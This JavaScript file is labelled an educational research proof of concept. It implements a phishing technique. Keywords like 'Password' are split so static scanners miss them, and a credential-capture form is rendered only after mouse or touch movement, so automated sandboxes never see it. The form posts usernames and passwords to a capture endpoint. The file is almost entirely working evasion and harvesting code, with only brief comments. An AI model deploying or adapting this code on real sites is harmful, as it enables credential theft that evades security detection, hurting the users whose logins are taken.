/**
 * RESEARCH POC: Client-Side Evasion & DOM Construction
 * OBJECTIVE: Demonstrate how modern threats evade static analysis using dynamic DOM rendering.
 * STATUS: Educational / Defensive Analysis
 */

// 1. STRING FRAGMENTATION TECHNIQUE
// Security Scanners often look for keywords like "Password", "Credit Card", or "Login".
// By splitting strings, static signatures fail to detect the content.

const UI_Components = {
    // "User" + "name" -> Reassembled only at runtime in RAM
    label_user: String.fromCharCode(85, 115, 101, 114) + "name", 
    
    // "Pass" + "word"
    label_pass: "Pass" + "word",
    
    // "Credit" + "Card"
    label_cc: "Cred" + "it " + "Ca" + "rd"
};

// 2. HUMAN INTERACTION TRIGGER
// Automated sandboxes usually just load the page code but don't move the mouse.
// We only render the sensitive form if human movement is detected.

function renderMaliciousForm() {
    console.log("[Audit] Human interaction detected. Decrypting payload...");
    
    const rootElement = document.getElementById('ghost-root');
    
    // Dynamic Injection: The form effectively "appears" out of nowhere
    rootElement.innerHTML = `
        <form method="POST" action="/audit/capture">
            <div class="field">
                <label>${UI_Components.label_user}</label>
                <input type="text" name="u_field" required>
            </div>
            <div class="field">
                <label>${UI_Components.label_pass}</label>
                <input type="password" name="p_field" required>
            </div>
            <button type="submit">Submit Securely</button>
        </form>
    `;
}

// 3. EVENT LISTENERS
// The trigger requires a specific event sequence to fire.
window.addEventListener('mousemove', renderMaliciousForm, { once: true });
window.addEventListener('touchstart', renderMaliciousForm, { once: true });
